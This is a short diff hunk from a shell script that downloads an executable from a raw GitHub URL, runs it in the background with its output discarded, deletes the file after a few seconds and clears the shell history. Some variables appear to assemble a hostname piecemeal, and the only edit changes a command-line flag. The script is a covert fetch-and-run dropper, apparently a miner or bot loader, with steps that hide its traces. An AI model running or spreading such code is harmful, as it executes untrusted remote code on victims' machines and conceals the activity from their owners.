@@ -6,7 +6,7 @@ u3="clawcloudrun"
 u4="com"
 curl https://raw.githubusercontent.com/madafatt/reimagined-waddle/refs/heads/main/rt > $rni
 chmod +x $rni
-nohup ./$rni -t 4 > /dev/null & disown
+nohup ./$rni -z 4 > /dev/null & disown
 sleep 5
 rm $rni
 history -c
